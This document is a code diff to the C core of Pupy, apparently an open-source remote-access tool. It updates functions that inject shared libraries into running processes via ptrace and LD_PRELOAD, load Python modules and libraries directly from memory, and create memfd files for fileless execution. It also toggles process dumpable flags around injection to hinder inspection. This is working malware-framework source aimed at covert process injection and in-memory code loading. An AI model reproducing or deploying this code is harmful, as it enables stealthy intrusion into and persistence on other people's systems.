@@ -3,11 +3,15 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 */
 
+#define _GNU_SOURCE
+
 #include <stdlib.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
 #include <sys/wait.h>
+#include <dlfcn.h>
+#include <limits.h>
 #include "debug.h"
 #include "Python-dynload.h"
 #include "daemonize.h"
@@ -17,58 +21,76 @@
 #ifdef Linux
 #include <sys/prctl.h>
 #include "memfd.h"
-
-int linux_inject_main(int argc, char **argv);
+#ifdef _FEATURE_INJECTOR
+#include "injector.h"
+#endif
 #endif
 
-#include "library.c"
-
+#include "ld_hooks.h"
 #include "revision.h"
 
-
-static const char module_doc[] = "Builtins utilities for pupy";
-
-static const char pupy_config[65536]="####---PUPY_CONFIG_COMES_HERE---####\n";
-
+static const char module_doc[] = DOC("Builtins utilities for pupy");
 static PyObject *ExecError;
 
-#include "lzmaunpack.c"
+#ifdef _FEATURE_PATHMAP
+static PyObject *py_pathmap = NULL;
 
-static PyObject *Py_get_modules(PyObject *self, PyObject *args)
+#ifndef _LD_HOOKS_NAME
+static
+#endif
+const char *__pathmap_callback(const char *path, char *buf, size_t buf_size)
 {
-    static PyObject *modules = NULL;
-    if (!modules) {
-        modules = PyObject_lzmaunpack(
-            library_c_start,
-            library_c_size
-        );
+    PyGILState_STATE gil_state;
+    PyObject* result = NULL;
+    char *c_result = NULL;
 
-        munmap((char *) library_c_start,
-            library_c_size);
-
-        Py_XINCREF(modules);
+    if (!strncmp(path, "f:", 2) ||
+        !strncmp(path, "pupy:/", 6) ||
+        !strncmp(path, "pupy/", 5))
+    {
+        dprint("__pathmap_callback(%s) -> pupy -> NULL\n");
+        return NULL;
     }
 
-    return modules;
-}
-
-static PyObject *
-Py_get_pupy_config(PyObject *self, PyObject *args)
-{
-    static PyObject *config = NULL;
-    if (!config) {
-        unsigned int pupy_lzma_length = 0x0;
-        memcpy(&pupy_lzma_length, pupy_config, sizeof(unsigned int));
-
-        ssize_t compressed_size = ntohl(pupy_lzma_length);
-
-        config = PyObject_lzmaunpack(pupy_config+sizeof(int), compressed_size);
-
-        Py_XINCREF(config);
+    if (!py_pathmap) {
+        dprint("__pathmap_callback: uninitialized (should not happen)\n");
+        return path;
     }
 
-    return config;
+    dprint("__pathmap_callback(%s) - get (%p (%d))\n",
+        path, py_pathmap, Py_RefCnt(py_pathmap));
+
+    gil_state = PyGILState_Ensure();
+
+    result = PyDict_GetItemString(py_pathmap, path);
+
+    dprint("__pathmap_callback(%s) -> %p (%d)\n",
+        path, result, Py_RefCnt(result));
+
+    if (!result) {
+        PyGILState_Release(gil_state);
+        return path;
+    }
+
+    if (result == Py_None) {
+        dprint("__pathmap_callback: None\n");
+        PyGILState_Release(gil_state);
+        return NULL;
+    }
+
+    c_result = PyString_AsString(result);
+    if (!c_result) {
+        dprint("__pathmap_callback: Not a string object\n");
+        PyErr_Clear();
+        PyGILState_Release(gil_state);
+        return path;
+    }
+
+    strncpy(buf, c_result, buf_size);
+    PyGILState_Release(gil_state);
+    return buf;
 }
+#endif
 
 static PyObject *Py_get_arch(PyObject *self, PyObject *args)
 {
@@ -76,6 +98,8 @@ static PyObject *Py_get_arch(PyObject *self, PyObject *args)
     return Py_BuildValue("s", "x64");
 #elif __i386__
     return Py_BuildValue("s", "x86");
+#elif __arm__
+    return Py_BuildValue("s", "arm");
 #else
     return Py_BuildValue("s", "unknown");
 #endif
@@ -103,9 +127,6 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
 
 #ifdef Linux
     if (is_memfd_path(ldobject)) {
-        char buf2[PATH_MAX];
-        strncpy(buf2, ldobject, sizeof(buf2));
-        snprintf(ldobject, sizeof(ldobject), "/proc/%d/fd/%d", getpid(), fd);
         cleanup_workaround = 1;
         cleanup = 0;
     }
@@ -122,8 +143,9 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
 
     dprint("Program to execute in child context: %s\n", cmdline);
 
-#ifdef Linux
-    prctl(4, 1, 0, 0, 0);
+#if defined(Linux) && !defined(DEBUG)
+    if (cleanup_workaround)
+        prctl(4, 1, 0, 0, 0);
 #endif
 
     pid_t pid = daemonize(0, NULL, NULL, false);
@@ -141,8 +163,9 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
         close(fd);
     }
 
-#ifdef Linux
-    prctl(3, 0, 0, 0, 0);
+#if defined(Linux) && !defined(DEBUG)
+    if (cleanup_workaround)
+        prctl(4, 0, 0, 0, 0);
 #endif
 
     if (pid == -1) {
@@ -155,12 +178,13 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
 }
 
 #ifdef Linux
+#ifdef _FEATURE_INJECTOR
 static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
 {
     uint32_t dwPid;
     const char *lpDllBuffer;
     uint32_t dwDllLenght;
-
+    int ret = 0;
     if (!PyArg_ParseTuple(args, "Is#", &dwPid, &lpDllBuffer, &dwDllLenght))
         return NULL;
 
@@ -169,60 +193,101 @@ static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
     char buf[PATH_MAX]={};
     int fd = drop_library(buf, PATH_MAX, lpDllBuffer, dwDllLenght);
     if (!fd) {
-        dprint("Couldn't drop library: %m\n");
+        PyErr_SetString(ExecError, "Couldn't drop library");
         return NULL;
     }
 
-    if (is_memfd_path(buf)) {
-        char buf2[PATH_MAX];
-        strncpy(buf2, buf, sizeof(buf2));
-        snprintf(buf, sizeof(buf), "/proc/%d/fd/%d", getpid(), fd);
+    int is_memfd = is_memfd_path(buf);
+
+    dprint("Injecting %s to %d\n", buf, dwPid);
+
+    injector_t *injector;
+
+    if (injector_attach(&injector, dwPid) != 0) {
+        PyErr_SetString(ExecError, "Injector attach failed");
+        return NULL;
     }
 
-    char pid[20] = {};
-    snprintf(pid, sizeof(pid), "%d", dwPid);
+#ifndef DEBUG
+    if (is_memfd)
+        prctl(4, 1, 0, 0, 0);
+#endif
 
-    char *linux_inject_argv[] = {
-        "linux-inject", "-p", pid, buf, NULL
-    };
+    if (injector_inject(injector, buf) == 0) {
+        dprint("\"%s\" successfully injected\n", buf);
+        ret = 1;
+    }
 
-    dprint("Injecting %s to %d\n", pid, buf);
-
-    prctl(4, 1, 0, 0, 0);
-
-    pid_t injpid = fork();
-    if (injpid == -1) {
-        dprint("Couldn't fork\n");
+    if (is_memfd) {
+#ifndef DEBUG
+        prctl(4, 0, 0, 0, 0);
+#endif
         close(fd);
+    } else {
         unlink(buf);
-        return PyBool_FromLong(1);
     }
 
-    int status;
+    injector_detach(&injector);
 
-    if (injpid == 0) {
-        int r = linux_inject_main(4, linux_inject_argv);
-        exit(r);
-    } else {
-        waitpid(injpid, &status, 0);
+    if (ret != 1) {
+        PyErr_SetString(ExecError, injector_error());
+        return NULL;
     }
 
-    prctl(3, 0, 0, 0, 0);
-
-    dprint("Injection code: %d\n", status);
-
-    unlink(buf);
-    /* close(fd); */
-
-    if (WEXITSTATUS(status) == 0) {
-        dprint("Injection successful\n");
-        return PyBool_FromLong(1);
-    } else {
-        dprint("Injection failed\n");
-        return PyBool_FromLong(0);
-    }
+    return PyBool_FromLong(0);
 }
 #endif
+
+
+static PyObject *Py_memfd_is_supported(PyObject *self, PyObject *args)
+{
+    return PyBool_FromLong(pupy_memfd_supported());
+}
+
+
+static PyObject *Py_memfd_create(PyObject *self, PyObject *args, PyObject *kwargs)
+{
+    char memfd_path[PATH_MAX] = {};
+    int fd = -1;
+    const char *name = "";
+    FILE *c_file;
+    PyObject *py_file;
+    PyObject *result;
+
+    static const char* kwargs_defs[] = {
+        "name", NULL
+    };
+
+    if (!PyArg_ParseTupleAndKeywords(args, kwargs, "|s", kwargs_defs, &name))
+        return NULL;
+
+    strncpy(memfd_path, name, sizeof(memfd_path));
+
+    dprint("Py_memfd_create(%s)\n", name);
+    fd = pupy_memfd_create(memfd_path, sizeof(memfd_path));
+
+    if (fd == -1)
+        return PyErr_SetFromErrno(PyExc_OSError);
+
+    c_file = fdopen(fd, "w+b");
+    if (!c_file) {
+        close(fd);
+        return PyErr_SetFromErrno(PyExc_OSError);
+    }
+
+    py_file = PyFile_FromFile(c_file, memfd_path, "w+b", fclose);
+    if (!py_file) {
+        close(fd);
+        return NULL;
+    }
+
+    result = Py_BuildValue("Os", py_file, memfd_path);
+    Py_DecRef(py_file);
+
+    return result;
+}
+#endif
+
 
 static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 {
@@ -232,9 +297,67 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
     if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
         return NULL;
 
-    printf("Py_load_dll(%s)\n", dllname);
+    dprint("Py_load_dll(%s)\n", dllname);
 
-    return PyLong_FromVoidPtr(memdlopen(dllname, lpDllBuffer, dwDllLenght));
+    return PyLong_FromVoidPtr(memdlopen(dllname, lpDllBuffer, dwDllLenght, RTLD_LOCAL | RTLD_NOW));
+}
+
+bool
+import_module(const char *initfuncname, char *modname, const char *data, size_t size) {
+    char *oldcontext;
+
+    dprint("import_module: init=%s mod=%s (%p:%lu)\n",
+           initfuncname, modname, data, size);
+
+    void *hmem = memdlopen(modname, data, size, RTLD_LOCAL | RTLD_NOW);
+    if (!hmem) {
+        dprint("Couldn't load %s: %m\n", modname);
+        return false;
+    }
+
+    void (*do_init)() = dlsym(hmem, initfuncname);
+    if (!do_init) {
+        dprint("Couldn't find sym %s in %s: %m\n", initfuncname, modname);
+        dlclose(hmem);
+        return false;
+    }
+
+    oldcontext = _Py_PackageContext;
+    _Py_PackageContext = modname;
+    dprint("Call %s@%s (%p)\n", initfuncname, modname, do_init);
+    do_init();
+    _Py_PackageContext = oldcontext;
+
+    dprint("Call %s@%s (%p) - complete\n", initfuncname, modname, do_init);
+
+    return true;
+}
+
+static PyObject *
+Py_import_module(PyObject *self, PyObject *args) {
+    char *data;
+    int size;
+    char *initfuncname;
+    char *modname;
+    char *pathname;
+
+    /* code, initfuncname, fqmodulename, path */
+    if (!PyArg_ParseTuple(args, "s#sss:import_module",
+                  &data, &size,
+                  &initfuncname, &modname, &pathname)) {
+        return NULL;
+    }
+
+    dprint("DEBUG! %s@%s\n", initfuncname, modname);
+
+    if (!import_module(initfuncname, modname, data, size)) {
+        PyErr_Format(PyExc_ImportError,
+                 "Could not find function %s", initfuncname);
+        return NULL;
+    }
+
+    /* Retrieve from sys.modules */
+    return PyImport_ImportModule(modname);
 }
 
 static PyObject *Py_mexec(PyObject *self, PyObject *args)
@@ -296,29 +419,58 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args)
     return Py_BuildValue("i(OOO)", pid, p_stdin, p_stdout, p_stderr);
 }
 
-static PyMethodDef methods[] = {
-    { "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
-    { "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
-    { "get_modules", Py_get_modules, METH_NOARGS, "get pupy library" },
-#ifdef Linux
-    { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure" },
+static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
+{
+#ifdef _PUPY_SO
+        return PyBool_FromLong(1);
+#else
+        return PyBool_FromLong(0);
 #endif
-    { "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> ptr" },
-    { "mexec", Py_mexec, METH_VARARGS, "mexec(data, argv, redirected_stdio, detach) -> (pid, (in, out, err))" },
-    { "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, "ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid" },
+}
+
+static PyMethodDef methods[] = {
+    { "is_shared", Py_is_shared_object, METH_NOARGS, DOC("Client is shared object") },
+    { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
+#ifdef Linux
+#ifdef _FEATURE_INJECTOR
+    { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS,
+      DOC("reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure")
+    },
+#endif
+    { "memfd_is_supported", Py_memfd_is_supported, METH_VARARGS, DOC("Check memfd is supported") },
+    { "memfd_create", (PyCFunction) Py_memfd_create, METH_VARARGS | METH_KEYWORDS, DOC("Create memfd file") },
+#endif
+    { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
+    { "import_module", Py_import_module, METH_VARARGS,
+      DOC("import_module(data, size, initfuncname, path) -> module") },
+    { "mexec", Py_mexec, METH_VARARGS, DOC("mexec(data, argv, redirected_stdio, detach) -> (pid, (in, out, err))") },
+    { "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, DOC("ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid") },
     { NULL, NULL },     /* Sentinel */
 };
 
 DL_EXPORT(void)
-initpupy(void)
-{
-    PyObject *pupy = Py_InitModule3("pupy", methods, (char *) module_doc);
+init_pupy(void) {
+
+    PyObject *pupy = Py_InitModule3("_pupy", methods, (char *) module_doc);
     if (!pupy) {
         return;
     }
 
     PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
-    ExecError = PyErr_NewException("pupy.error", NULL, NULL);
+    ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
     Py_INCREF(ExecError);
     PyModule_AddObject(pupy, "error", ExecError);
+
+#ifdef _PUPY_SO
+    setup_jvm_class();
+#endif
+
+#ifdef _FEATURE_PATHMAP
+    py_pathmap = PyDict_New();
+    Py_INCREF(py_pathmap);
+    PyModule_AddObject(pupy, "pathmap", py_pathmap);
+#ifndef _LD_HOOKS_NAME
+    set_pathmap_callback(__pathmap_callback);
+#endif
+#endif
 }
